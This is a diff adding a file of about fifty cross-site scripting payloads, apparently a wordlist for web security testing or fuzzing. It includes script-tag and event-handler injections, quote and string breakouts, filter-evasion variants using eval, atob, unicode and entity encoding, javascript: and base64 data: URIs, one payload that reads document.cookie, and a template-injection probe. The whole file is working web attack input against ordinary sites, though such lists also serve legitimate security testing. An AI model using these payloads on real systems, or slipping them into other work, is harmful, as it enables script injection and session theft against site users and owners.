@@ -1,0 +1,50 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<marquee onstart=alert(1)>
+<animate onbegin=alert(1) attributeName=x>
+" onmouseover="alert(1)
+" autofocus onfocus="alert(1)
+" onclick="alert(1)
+" onscroll="alert(1)
+" oncopy="alert(1)
+" onwheel="alert(1)
+" ondrag="alert(1)
+" onauxclick="alert(1)
+" oncontextmenu="alert(1)
+" onkeydown="alert(1)
+';alert(1)//
+'-alert(1)-'
+';alert(1);'
+\';alert(1)//
+</script><script>alert(1)</script>
+${alert(1)}
+'},alert(1),{
+');alert(1);('
+"]};alert(1)//
+\u0027;alert(1)//
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=eval('al'+'ert(1)')>
+<img src=x onerror=top['al\x65rt'](1)>
+<a href="javascript:\u0061lert(1)">Click</a>
+<img src=x onerror="alert` + "`(1)`" + ">
+<svg/onload=alert(1)>
+<%27--><script>alert(1)</script>
+<iframe srcdoc="&lt;img src&equals;x onerror&equals;alert&lpar;1&rpar;&gt;"></iframe>
+<img src=x onerror=with(document)alert(cookie)>
+javascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+javascript:eval(atob('YWxlcnQoMSk='))
+#<img src=x onerror=alert(1)>
+javascript:window.onerror=alert;throw 1
+javascript:location='javascript:alert(1)'
+#{{7*7}}
+<form id="test" onforminput="alert(1)"><input type="submit"></form>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
